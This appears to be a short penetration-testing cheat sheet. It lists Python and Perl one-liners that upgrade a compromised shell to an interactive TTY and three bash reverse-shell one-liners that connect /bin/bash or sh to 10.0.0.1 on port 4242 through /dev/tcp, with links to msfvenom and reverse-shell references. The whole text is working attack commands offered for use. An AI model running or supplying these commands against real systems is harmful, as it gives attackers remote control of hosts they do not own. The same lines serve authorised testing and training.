## Shellcodes
- Upgrading to a fully interactive shell if python is installed:
```
python -c 'import pty; pty.spawn("/bin/sh")'
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
perl -e 'exec "/bin/sh";'
```
- One-liner fifo reverse shell of Linux
```
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1

0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196

/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
```
- [Msfvenom cheatsheet](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom)
- [Reverse shell cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)
